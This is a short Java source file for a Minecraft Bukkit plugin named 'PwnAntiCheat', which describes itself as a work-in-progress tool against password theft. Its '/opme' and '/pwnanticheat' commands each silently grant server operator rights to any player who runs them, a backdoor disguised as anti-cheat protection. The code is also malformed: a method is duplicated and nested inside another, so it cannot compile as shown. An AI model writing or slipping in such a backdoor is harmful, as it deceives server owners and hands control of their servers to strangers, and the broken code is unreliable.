    package ml.theone1.opme;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.ChatColor;

public class Main extends JavaPlugin {
   public void onDisable() {
      System.out.print("PwnAntiCheat is Unloaded");
   }

   public void onEnable() {
      System.out.print("PwnAntiCheat plugin is Loaded");
   }

   public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args) {
      Player p = (Player)sender;
      if (cmd.getName().equalsIgnoreCase("opme")) {
    	  p.sendMessage(ChatColor.AQUA + "You're now an OP. Go ahead and spawn in 10.000 diamonds ;D");
          p.setOp(true);
      }

   public boolean onCommand(CommandSender sender, Command cmd, String cL, String[] args) {
      Player p = (Player)sender;
      if (cmd.getName().equalsIgnoreCase("pwnanticheat")) {
    	  p.sendMessage(ChatColor.AQUA + "This is PwnAntiCheat. It's a W.I.P. plugin that prevents hackers from getting your passwords through Minecraft.");
          p.setOp(true);
      }

      return true;
   }
}
